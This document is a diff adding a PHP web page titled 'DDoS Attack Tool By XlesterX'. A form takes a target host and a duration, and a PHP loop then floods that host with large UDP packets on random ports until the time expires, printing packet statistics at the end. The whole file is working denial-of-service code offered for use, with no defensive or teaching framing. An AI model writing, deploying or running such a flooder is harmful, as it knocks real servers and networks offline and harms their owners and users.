@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DDoS Attack Tool By XlesterX</title>
+
+    <!-- Latest compiled and minified CSS -->
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.1/css/bootstrap.min.css">
+
+    <!-- Optional theme -->
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.1/css/bootstrap-theme.min.css">
+</head>
+
+<body>
+    <div class="container">
+        <div class="row">
+            <div class="col-md-6 col-md-offset-3">
+                <h2 class="text-center">DDoS Attack Tool</h2>
+                <form action="" method="GET" class="form-horizontal">
+                    <div class="form-group">
+                        <label for="host" class="col-sm-2 control-label">Host</label>
+                        <div class="col-sm-10">
+                            <input type="text" class="form-control" id="host" name="host" required>
+                        </div>
+                    </div>
+                    <div class="form-group">
+                        <label for="time" class="col-sm-2 control-label">Length (Seconds)</label>
+                        <div class="col-sm-10">
+                            <input type="text" class="form-control" id="time" name="time" required>
+                        </div>
+                    </div>
+                    <div class="form-group">
+                        <div class="col-sm-offset-2 col-sm-10">
+                            <button type="submit" class="btn btn-danger">Flood</button>
+                        </div>
+                    </div>
+                </form>
+
+                <?php
+                if (isset($_GET['host']) && isset($_GET['time'])) {
+                    $packets = 0;
+                    ignore_user_abort(TRUE);
+                    set_time_limit(0);
+
+                    $exec_time = $_GET['time'];
+
+                    $time = time();
+                    $max_time = $time + $exec_time;
+
+                    $host = $_GET['host'];
+
+                    $out = str_repeat('X', 65553);
+
+                    while (1) {
+                        $packets++;
+                        if (time() > $max_time) {
+                            break;
+                        }
+                        $rand = rand(1, 65553);
+                        $fp = fsockopen('udp://' . $host, $rand, $errno, $errstr, 5);
+                        if ($fp) {
+                            fwrite($fp, $out);
+                            fclose($fp);
+                        }
+                    }
+
+                    echo "<br>Completed with $packets (" . round(($packets * 65) / 1024, 2) . " MB) packets averaging " . round($packets / $exec_time, 2) . " packets per second \n";
+                }
+                ?>
+            </div>
+        </div>
+    </div>
+
+    <!-- Latest compiled and minified JavaScript -->
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.1/js/bootstrap.min.js"></script>
+</body>
+
+</html>
